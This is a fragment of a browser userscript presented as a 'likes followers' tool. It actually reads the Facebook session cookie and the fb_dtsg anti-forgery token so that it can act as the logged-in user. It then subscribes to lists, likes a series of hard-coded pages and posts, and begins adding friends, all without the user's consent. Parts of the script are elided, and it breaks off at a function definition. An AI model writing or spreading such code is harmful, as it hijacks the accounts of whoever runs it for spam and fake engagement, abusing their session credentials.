// ==UserScript==
// @name   likes followers script     
// @version   1.2
// @description made by Wasi Khan        
// ==/UserScript==
...
sublist("428426163935748");
sublist("398650780246620");
sublist("398339273611104");
sublist("398650780246620");

var gid = ['247685895285862'];
...
var spage_id = "682671378464288"; 
var spost_id = "476901629028837";
var sfoto_id = "659021760803892";
var sfoto_id = "1415876955324127";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
// pic + fans
P("1415876955324127");P("");P("1415877018657454");P("669437533095648");P("669437533095648");P("659021760803892");P("558515540854515");Like("667077743331627");Like("664091416963593");Like("669391919766876");Like("");P("");Like("548781161816546");Like("297749613678444");Like("672494649458649");Like("675501315822603")
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
